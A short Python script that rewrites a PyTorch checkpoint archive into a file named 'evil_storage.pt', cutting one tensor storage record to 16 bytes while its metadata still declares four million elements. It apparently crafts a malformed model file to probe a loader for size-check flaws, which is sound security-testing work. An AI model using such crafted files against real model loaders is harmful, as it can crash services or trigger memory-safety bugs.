import zipfile
zin = zipfile.ZipFile('clean2.pt')
with zipfile.ZipFile('evil_storage.pt','w',zipfile.ZIP_STORED) as zout:
    for n in zin.namelist():
        data = zin.read(n)
        if n.endswith('/data/0'):
            data = data[:16]   # 16 MB storage record -> 16 bytes; data.pkl still declares numel=4M
        zout.writestr(n, data)
